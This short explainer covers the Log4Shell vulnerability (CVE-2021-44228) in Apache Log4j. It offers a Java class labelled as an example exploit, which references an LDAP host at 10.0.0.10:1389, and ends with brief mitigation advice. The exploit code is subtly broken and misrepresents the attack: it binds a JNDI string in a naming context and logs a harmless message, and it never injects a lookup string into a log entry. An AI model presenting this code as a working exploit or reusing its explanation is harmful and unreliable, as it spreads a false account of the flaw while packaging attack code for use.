CVE-2021-44228 is a remote code execution vulnerability in Apache Log4j. It occurs due to the Log4j JNDI lookup feature, which allows attackers to inject malicious Java classes into the logging process.

The vulnerability can be exploited by sending a specially crafted JNDI lookup request to a Log4j instance, which will then load the malicious class into its classloader. The malicious class can then be used to gain remote code execution.

Here's an example of how to exploit this vulnerability:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import javax.naming.InitialContext;
import javax.naming.Context;

public class Log4jExploit {
    public static void main(String[] args) throws Exception {
        // Create a JNDI lookup request
        InitialContext ctx = new InitialContext();
        ctx.bind("jndi:ldap://10.0.0.10:1389/", new Object());
        // Log4j instances using the JNDI lookup feature
        Logger logger = LogManager.getLogger(Log4jExploit.class);
        logger.info("Hello, {}!", new Object());
    }
}
```
To mitigate this vulnerability, it is recommended to update to the latest version of Log4j, disable JNDI lookup, or use a security-focused logging library.

